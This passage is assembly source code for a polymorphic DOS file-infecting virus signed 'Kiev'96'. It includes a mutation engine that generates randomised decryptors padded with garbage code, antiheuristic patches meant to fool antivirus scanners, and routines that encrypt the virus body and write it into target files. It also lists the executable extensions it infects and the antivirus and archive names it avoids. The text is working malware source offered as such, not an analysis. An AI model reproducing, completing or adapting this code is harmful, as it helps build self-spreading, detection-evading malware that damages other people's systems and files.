;       DS - points to segment of code to be encrypted.
;       SI - an offset of PATTERN.
;
;       When finished:
;       ÖS:0 - crypted code.
;       DI - its size in bytes.
;-----------------------------------------------------------------------------
;       A structure of encryptor:
;       -------------------------
;
;       mov     reg1,offcode    ; offcode - offset of crypted code
;       mov     reg2,-vl        ; vl - it's length
;       mov     reg3,code_1
;Decode:
;       oper1   word ptr ds:[reg1],reg3
;       inc     reg1
;       inc     reg1
;       oper2   reg3,code_2
;       inc     reg2
;       jnz     Decode
;
;       --------------------------------
;
;       reg1        - SI,DI,BX or BP
;       reg2,reg3   - AX,BX,CX,DX,BP,SI or DI
;       oper1       - XOR,ADD or SUB
;       oper2       - ADD or SUB
;
;       All registers unused in decryptors are used in garbage instructions.
;-----------------------------------------------------------------------------
POLY_LEVEL:
        IN   AL,40h
        OR   AL,AL
        JZ   POLY_LEVEL

        PUSH SI
        PUSH DS
        PUSH CS
        POP  DS
;---------------------------------------------------------
;       Random function of 21h call generating.
;---------------------------------------------------------
        XOR  DI,DI
        MOV  SI,OFFSET ANTIWEB-START+10h
        MOV  BYTE PTR DS:[SI+1],AL
        IN   AL,40h
        AND  AL,0Fh
        ADD  AL,0E0h
        MOV  BYTE PTR DS:[SI+3],AL

;---------------------------------------------------------
;       Antiheuristic patch creating
;---------------------------------------------------------
        MOV  BP,10h+1   ; Don't change SP and AX in decryptor
        MOV  CX,06h
ANTI:
        CMP  CL,2
        JNE  NO_GLUE
        MOV  AL,74h
        STOSB
        PUSH DI
        INC  DI
NO_GLUE:
        CALL MAKE
        MOVSW
        LOOP ANTI

        POP  BX
        MOV  AX,DI
        SUB  AX,BX
        DEC  AX
        DEC  AX
        DEC  AX
        MOV  BYTE PTR ES:[BX],AL        ; BYTE FOR JE

;----------------------------------------------------------
;       Creating a decryptor
;----------------------------------------------------------

        SUB  BP,1       ; To free AX
        CALL MAKE

;---------------------------------------------
;       First instruction
;---------------------------------------------
instr1:
        CALL ZEROTWO

        MOV  AL,BYTE PTR DS:[BX+OFFSET PACK_1-START+10h]
        STOSB
        PUSH DI         ; Needed for decryptor
        STOSW           ; To reserve a place for offset
        MOV  AL,BYTE PTR DS:[BX+3+OFFSET PACK_1-START+10h]
        MOV  BYTE PTR DS:[SI+1],AL
        MOV  AL,BYTE PTR DS:[BX+6+OFFSET PACK_1-START+10h]
        MOV  AH,AL
        MOV  WORD PTR DS:[SI+2],AX
        SUB  AL,40h
        MOV  BL,AL
        CALL FILL       ; Make a register busy
        CALL MAKE
;-----------------------------------------------
;       Second instruction
;-----------------------------------------------
instr2:
        call f_reg
        mov  al,40h
        add  al,bl
        mov  byte ptr ds:[si+7],al
        in   ax,40h
        and  ax,0Fh
        sub  ax,(3584-28)/2
        stosw
        call make
;------------------------------------------------
;       Third instruction
;------------------------------------------------
instr3:
        call f_reg

        mov  byte ptr ds:[si+5],bl

        mov  al,8
        mul  bl
        add  byte ptr ds:[si+1],al
        in   ax,40h
        add  ax,di
        stosw
        push di
        mov  word ptr ds:[offset encryptor - start + 10h - 4],ax
        call make
;--------------------------------------------------
;       To choose operations
;--------------------------------------------------
        CALL ZEROTWO

        mov  al,byte ptr ds:[offset mirror1 - start + 10h + bx]
        mov  byte ptr ds:[si],al
        neg  bx
        mov  al,byte ptr ds:[offset mirror1 - start + 10h + bx + 2]
        mov  byte ptr ds:[offset encryptor-start+10h+2],al

        call RND

        and  bl,1
        mov  al,byte ptr ds:[offset mirror2 - start + 10h + bx]
        add  byte ptr ds:[si+5],al
        add  al,3
        mov  byte ptr ds:[offset encryptor-start+10h+6],al

;-----------------------------------------------------
;       To copy rest of decryptor
;-----------------------------------------------------
        movsw
        call make
        movsb
        call make
        movsb
        call make
        movsw
        IN   AL,40h
        MOV  BYTE PTR DS:[OFFSET ENCRYPTOR - START + 10h + 7],AL
        STOSB
        inc  si
        call make
        movsw
        MOV  AX,0FFh
        SUB  AX,DI
        POP  BX
        ADD  AX,BX      ; BYTE for JNZ instruction
        stosb
        call make

        POP  SI
        MOV  AX,DI
        ADD  AX,WORD PTR DS:[newbytes+14h]
        MOV  WORD PTR ES:[SI],AX                ; Offset of crypted code

        MOV  CX,(3584-28)/2
        MOV  BX,0FFFFh
        POP  DS
        POP  SI
ENCRYPTOR:
        MOVSW
        XOR  WORD PTR ES:[DI-2],BX
        SUB  BX,0
        LOOP ENCRYPTOR

        PUSH CS
        POP  DS

        MOV  DI,3584-28
        IN   AX,40H
        STOSW
        MOV  BX,AX
        MOV  SI,BYTES
        MOV  CX,0Dh
        MOV  AX,'EM'
CYCLE:
        XOR  AX,BX
        STOSW
        LODSW
        LOOP CYCLE
;-------------------------------
;       Write modul to file...
;-------------------------------
        PUSH ES
        POP  DS
        XOR  DX,DX
        MOV  CX,DI
        CALL WRITE_X
        CALL SEEK_H
        PUSH CS
        POP  DS
        RET
MODUL   ENDP

NEW_SEG PROC NEAR
        PUSH ES
        POP  DS
        MOV  SI,VIDEO
        MOV  DI,ES
        CMP  DI,SI
        JNE  NO_NEW
        ADD  SI,100h
NO_NEW:
        MOV  ES,SI
        XOR  SI,SI
        XOR  DI,DI
        IN   AX,40h
        RET
NEW_SEG ENDP

REMOVE  PROC NEAR
        PUSH CS
        POP  DS
        MOV  CX,VL/2+08h
        MOV  DI,10h
        REP  MOVSW
        RET
REMOVE  ENDP

TRIM    PROC NEAR
        SBB  DX,0
        XCHG CX,AX
        XCHG DX,CX
        XOR  AL,AL
        CALL SEEK_Z
        RET
TRIM    ENDP

READ_L  PROC NEAR
        CALL SEEK_E
        JC   NO_FILE

        SUB  AX,1Ch
        CALL TRIM

        PUSH CS
        POP  DS
        MOV  CX,1Ch
        MOV  DX,BYTES
        CALL READ_X

        CLD
        MOV  SI,BYTES
        LODSW
        PUSH SI
        MOV  CX,0Dh
DECODE:
        XOR  WORD PTR DS:[SI],AX
        INC  SI
        INC  SI
        LOOP DECODE

        POP  SI
        LODSW
NO_FILE:
        CMP  AX,'EM'    ; Brand name ;-)
        RET
READ_L  ENDP

WRITE_L PROC NEAR
        PUSH SI
        CALL SEEK_H

        POP  DX
        CALL WRITE_H
TALE_OUT:
        MOV  AL,2
        CALL SEEK_X

        SUB  AX,0E00h
        CALL TRIM

        XOR  CX,CX
        CALL WRITE_X
        RET
WRITE_L ENDP

S_INIT  PROC NEAR
        MOV  CX,DS:[HNEW]
        MOV  DX,DS:[LNEW]
RCOMP:
        XOR  AX,AX
        CMP  CX,DS:[NO_HIGH]
        JB   N_FLAG
        JA   S_FLAG
        CMP  DX,DS:[NO_LOW]
        JB   N_FLAG
S_FLAG:
        STC
        RET
N_FLAG:
        CLC
        RET
S_INIT  ENDP

make    proc near
;-----------------------
; Makes from 1 up to 16
; bytes of garbage code
;-----------------------
        in   ax,40h
        and  ax,00001111b
        inc  ax                 ; Number of bytes
        mov  dx,ax
poly:
        push dx
;------------------------------------
;       Generate 1-byte command
;------------------------------------
form_1:
        call RND

        mov  al,byte ptr ds:[bx+offset data_1-start+10h]
good_1:
        stosb
        dec  dx
form_2:
;-------------------------------------
;       Generate 2-bytes command
;-------------------------------------
        cmp  dx,2
        jb   poly_stop

        call RND
        call _free
        jnz  form_3

        mov  al,8
        mul  bl
        add  al,0C0h
        push ax
        call RND
        pop  ax
        add  al,bl
        xchg ah,al

        mov  al,byte ptr ds:[bx+offset data_2-start+10h]
        stosw
        dec  dx
        dec  dx
form_3:
;-------------------------------------
;       Generate 3-bytes command
;-------------------------------------
        cmp  dx,3
        jb   poly_stop

        call _form
        jnz  form_4
        mov  al,83h
        stosw
        in   al,40h
        stosb
        sub dx,3
form_4:
;-------------------------------------
;       Generate 4-bytes command
;-------------------------------------
        cmp  dx,4
        jb   poly_stop

        call _form
        jnz  poly_stop
        mov  al,81h
        stosw
        in   ax,40h
        xor  ax,di
        stosw
        sub  dx,4
poly_stop:
        or   dx,dx
        jnz  form_1

        pop  dx

        ret
make    endp

f_reg   proc near
instr_x:
        call rnd
        call _free
        jnz  instr_x
        call fill
        mov  al,0B8h
        add  al,bl
        stosb
        ret
f_reg   endp

zerotwo proc near
        call rnd
        mov  ax,bx
        mov  bl,3
        div  bl
        mov  bl,ah
        ret
zerotwo endp

db      '-=Unlimited Grief=-'

STR1    PROC NEAR
        PUSH SI
DOCOMP:
        CMPSW
        JNZ  NEXTSTR
        CMPSB
        JZ   EXITSTR
        DEC  SI
        DEC  DI
NEXTSTR:
        INC  SI
        DEC  DI
        DEC  DI
        DEC  CX
        JNZ  DOCOMP
EXITSTR:
        POP  SI
        JMP  SHORT CHKAWAY
STR1    ENDP

CHKNAME PROC NEAR
        MOV  AL,4
CHK1:
        PUSH DI
        MOV  CL,6
CHKTHIS:
        PUSH CX
        PUSH DI
        MOV  CL,AL
        CALL STR1
        POP  DI
        POP  CX
        JNZ  EXITNAME
        INC  DI
        LOOP CHKTHIS
EXITNAME:
        POP  DI
CHKAWAY:
        OR   CX,CX
        RET
CHKNAME ENDP

;-----------------------------------------------------------------
;       These shity programs are too stinky to be even infected
;-----------------------------------------------------------------
EXTEN   db      'COM','EXE','OVL','OVR'
ANTIV   db      'PRO','SCA','EXT','WEB'
ARCHV   db      'ARJ','RAR','LHA','ZIP'
DONOT   db      'COM','WIN'
ALL     db      'CHK'
;-----------------------------------------------------------------
;       Data for polymorphic engine
;-----------------------------------------------------------------
        data_1   db   0f5h,0f8h,0f9h,0fbh,0fch,0fdh,090h,0cch
        data_2   db   03h,0bh,013h,01bh,023h,02bh,033h,085h
pack_1:
        mov_reg1  db  0beh,0bfh,0bbh
        xor_reg1  db  04h,05h,07h
        inc_reg1  db  046h,047h,043h
operations:
        mirror1  db  01h,031h,029h
        mirror2  db  0c0h,0e8h
;-------------------------------------------------------------------

_free   proc near
        push cx
        push bx
        mov  cl,bl
        mov  bl,1
        shl  bl,cl
        test bp,bx
        pop  bx
        pop  cx
        ret
_free   endp

_form   proc near
        call RND
        and  al,03Fh
        add  al,0C0h
        xchg al,ah
        call _free
        ret
_form   endp

FILL    PROC NEAR
        PUSH BX
        PUSH CX
        MOV  CL,BL
        MOV  BL,1
        SHL  BL,CL
        POP  CX
        ADD  BP,BX
        POP  BX
        RET
FILL    ENDP

RND     PROC NEAR
;---------------------------
; A bad way for getting a
; random number
;---------------------------
        PUSH DX
        IN   AX,[40h]
        ADD  AX,DS:[OFFSET SEED-START+10h]
        MOV  DX,25173
        MUL  DX
        ADD  AX,13849
        POP  DX
        MOV  DS:[OFFSET SEED-START+10h],AX
        XOR  AX,DS:[OFFSET FORXOR-START+10h]
        MOV  BX,AX
        AND  BX,7
        RET
RND     ENDP

SEED    DW   37849
FORXOR  DW   559

db      'Kiev',27h,'96'         ; Kiev'96

INTINST:
        MOV  BX,0FFFFh
        MOV  DX,SS
        MOV  BP,SP
        MOV  CX,(3584-28)/2
        CALL FUCK
FUCK:
        POP  SI
        ADD  SI,OFFSET GRID-FUCK
        MOV  AX,CS
PUZZLE:
        CLI
        MOV  SS,AX
        MOV  SP,SI
CRYPT:
        POP  AX
        XOR  AX,BX
        PUSH AX
        INC  SP
        INC  SP
        LOOP CRYPT
        MOV  SS,DX
        MOV  SP,BP
        STI
GRID:
        MOV  AX,0F0Fh
        MOV  CX,(3584-28)/3
        CALL FUCK1
FUCK1:
        POP  SI
        ADD  SI,OFFSET FICTION - FUCK1
GRID_IT:
        SUB  WORD PTR DS:[SI],AX
        INC  SI
        INC  SI
        INC  SI
        LOOP GRID_IT
        JMP  SHORT FICTION
        db   'EMME 3'
FICTION:
        MOV  CX,(3584-28)/4
        CALL FUCK2
FUCK2:
        POP  SI
        ADD  SI,OFFSET ANTIWEB - FUCK2
        CLD
MIX_IT:
        LODSW
        XOR  WORD PTR DS:[SI],AX
        LODSW
        LOOP MIX_IT
        JMP  SHORT ANTIWEB
        db   'See You'
ANTIWEB:
;--------------------------------
;       ANTI-WEB PATTERN
;--------------------------------
        MOV  AL,0E0h
        MOV  AH,0E0h
        INT  21h
        OR   AL,AL
        INT  20h
        PUSH CS
        POP  DS
;--------------------------------
;       INSTALLATION PATTERN
;--------------------------------
PATTERN:
        XOR  WORD PTR DS:[DI],BX
        INC DI
        INC DI
        SUB BX,0
        INC CX
        JNZ PATTERN
;----------------------------------------
VIREND:
;----------------------------------------
;       Is it really COOL?
;----------------------------------------
        INT 20h         ; ORIGINAL BYTES
;----------------------------------------
        END  START